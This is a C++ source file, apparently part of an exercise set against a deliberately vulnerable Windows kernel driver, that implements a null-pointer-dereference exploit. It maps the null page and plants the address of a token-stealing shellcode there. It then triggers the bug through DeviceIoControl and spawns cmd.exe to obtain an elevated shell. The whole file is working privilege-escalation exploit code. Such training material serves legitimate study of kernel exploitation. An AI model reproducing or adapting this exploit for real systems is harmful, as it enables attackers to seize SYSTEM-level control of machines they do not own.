#include <Windows.h>
#include <iostream>

#include "Solutions.h"
#include "ioctal_codes.h"
#include "utils.h"

typedef NTSTATUS(WINAPI* pNtAllocateVirtualMemory)(
		IN HANDLE ProcessHandle,
		IN OUT PVOID* BaseAddress,
		IN ULONG_PTR ZeroBits,
		IN OUT PSIZE_T RegionSize,
		IN ULONG AllocationType,
		IN ULONG Protect
	);

NTSTATUS Solutions::TriggerNullPointerDereference() {
	LPVOID lpInBuffer = NULL;
	DWORD dwLen = 8;
	DWORD dwBytesReturned = 0;

	allocate_null_page(0x1000);

	// we just allocated it :)
	const char* buf = 0;

	std::cout << "[+] Allocated Null Page" << std::endl;
	*(PULONG)(buf + 4) = (ULONG)(&token_stealing_shellcode_write_what_where);

	lpInBuffer = (LPVOID)"AAAAAAAA";

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_NULL_POINTER_DEREFERENCE,
		lpInBuffer, dwLen, NULL, NULL, &dwBytesReturned, NULL)) {
		std::cout << "[-] Could not talk with the driver" << std::endl;
		return 1;
	}

	std::cout << "[+] Succsfully talked with the driver" << std::endl;

	system("cmd.exe");
}